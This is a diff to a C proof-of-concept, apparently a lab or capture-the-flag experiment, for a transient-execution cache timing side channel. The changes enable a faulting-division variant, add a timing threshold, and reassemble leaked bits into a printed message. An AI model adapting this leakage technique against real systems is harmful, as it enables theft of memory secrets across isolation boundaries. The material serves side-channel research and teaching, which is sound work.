@@ -7,10 +7,14 @@
 #define PUBLEN 32
 #define PUBBITS (PUBLEN * 8)
 
+int verbose = 0;
+
+#define threshold 50
+
 int publen = PUBLEN;
 char buf[PUBLEN * 2];
 alignas(4096) __attribute__((section(".mysection"))) char pad = 1;
-alignas(4096) __attribute__((section(".mysection"))) char flag = 1234;
+alignas(4096) __attribute__((section(".mysection"))) char flag = 12;
 alignas(4096) __attribute__((section(".mysection"))) int *p1 = &publen;
 alignas(4096) __attribute__((section(".mysection"))) int **p2 = &p1;
 alignas(4096) __attribute__((section(".mysection"))) int ***p3 = &p2;
@@ -39,14 +43,14 @@ static __attribute__((noinline)) void probe(char *buf, char *flag, unsigned byte
     return;
   asm volatile ("mov %0, %%al" :: "m"(flag) : "al");
   unsigned val = get_bit_raw(buf, byte_idx, bit_idx);
-#if 0
+#if 1
   asm ("mov %0, %%ecx\n"
        "mov $0, %%ax\n"
        "div %%cl\n"
        : "+r"(val)
        :: "rcx", "rax", "rdx");
 #endif
-#if 1
+#if 0
   volatile int x = flag[4096 - 4096 * val];
 #elif 1
   volatile int x = flag[val];
@@ -104,19 +108,28 @@ static int leak_bit(char *buf, int byte_idx, int bit_idx) {
 
   // Check if the flag was cached.
   int t = ts[idx];
-  printf("%d\t%d\n", get_bit_raw(buf, byte_idx, bit_idx), t);
-  fflush(stdout);
+  if (verbose) {
+    printf("%d\t%d\n", get_bit_raw(buf, byte_idx, bit_idx), t);
+    fflush(stdout);
+  }
+  return t < threshold;
 }
 
 int main() {
   init();
+  char msg[sizeof buf];
+  memset(msg, 0, sizeof msg);
   for (int i = 0; i < sizeof buf; ++i) {
-#if 0
+#if 1
+    char byte = 0;
     for (int j = 0; j < 8; ++j) {
-      leak_bit(i, j);
+      const int bit = leak_bit(&buf[0], i, j);
+      byte |= bit << j;
     }
+    msg[i] = byte;
 #else
     leak_bit(&buf[0], i, 0);
 #endif
   }
+  printf("Message: %s\n", msg);
 }
